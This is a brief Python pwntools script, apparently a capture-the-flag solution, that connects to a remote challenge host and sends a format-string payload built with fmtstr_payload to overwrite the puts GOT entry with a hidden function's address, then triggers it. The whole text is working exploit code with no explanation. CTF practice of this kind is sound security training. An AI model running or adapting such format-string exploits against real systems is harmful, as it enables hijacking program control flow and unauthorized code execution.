from pwn import *

#sh = process('./pwn')
sh = remote('111.200.241.244', 55359)
#sh = gdb.debug('./pwn')
context.binary = './pwn'
e = ELF('./pwn')
context.log_level = 'debug'

_execute_addr = 0x4008DE
_puts_got = e.got['puts']

sh.recv()

sh.sendline(b'2')

payload = fmtstr_payload(6, {_puts_got: _execute_addr})

print(payload)

sh.sendline(payload)

sh.recv()

sh.sendline(b'3')

print(sh.recvall())
